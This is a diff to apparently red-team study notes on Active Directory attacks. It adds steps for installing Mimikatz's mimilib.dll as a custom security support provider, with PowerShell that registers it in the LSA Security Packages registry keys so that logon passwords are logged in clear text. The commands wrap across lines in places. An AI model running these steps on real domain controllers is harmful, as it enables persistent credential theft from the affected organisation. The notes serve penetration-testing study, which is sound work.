@@ -338,3 +338,21 @@ $ ls \\dcorp-dc\C$
 - Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.
 
 
+**_Examples -:_**
+
+
+- [ ] We can use either of the ways:
+
+- Drop the mimilib.dll to system32 and add mimilib to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security` Packages:
+
+```powershell
+$packages = Get-ItemProperty
+HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
+Packages'| select -ExpandProperty 'Security Packages'
+$packages += "mimilib"
+Set-ItemProperty
+HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security
+Packages' -Value $packages
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
+'Security Packages' -Value $packages
+```
